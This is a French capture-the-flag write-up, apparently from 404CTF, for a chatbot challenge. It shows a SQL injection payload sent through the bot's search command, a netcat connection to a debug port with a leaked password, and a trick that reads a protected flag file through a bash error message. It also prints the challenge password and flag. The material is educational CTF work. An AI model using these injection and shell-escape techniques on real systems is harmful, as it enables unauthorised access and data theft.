```
Commandes disponibles :
!chercher argument -> rechercher argument dans la base de données
!authentification motdepasse -> authentifiez vous pour accéder au mode privilégié
!drapeau -> obtenez un mystérieux drapeau
!debug -> debug command
```

On a à présent accès à une nouvelle commande : !debug, qui donne

`Debug déployé sur le port 31337 ! Mot de passe : p45_uN_4uT0m4t3`

On a donc besoin d'y accéder d'une quelconque manière.

Infos utiles :
Version : `10.6.7-MariaDB`
User : `data@10.2.2.24`
Hostname : `not-a-bot-mariadb-0`
Datadir : `/bitnami/mariadb/data/`
Port : `31337`
Password : `p45_uN_4uT0m4t3`
Database : `data`

Tout est bon et beau... sauf qu'on n'a pas d'IP publique à viser.

Chercher les plugins n'apporte pas grand chose d'utile
`!chercher ." UNION SELECT plugin_name from information_schema.plugins #`

On va essayer d'accéder au service de debug comme d'hab avec l'host challenge.404ctf.fr

SSH et mysql refusent la connexion mais on y arrive avec netcat

`nc challenge.404ctf.fr 31337` + mot de passe

On arrive dans un vieux bash tout pété, il va falloir être délicat pour trouver un flag dans cette ruine

```
bash-4.4$ echo /app/*
/app/auth_wall.sh /app/flag.txt

bash-4.4$ /app/flag.txt
bash: /app/flag.txt: Permission denied
```

On a notre fichier, mais on ne peut pas l'afficher. Tristesse.
On est dans une jail, il nous faut trouver un bon client pour afficher le flag.

On a du bol, on a un bash sous la main
`/bin/bash ./flag.txt`

`./flag.txt: line 1: 404CTF{17_s_4g155417_3n_f4iT_d_1_b0t}: command not found`

Merci m'sieur !

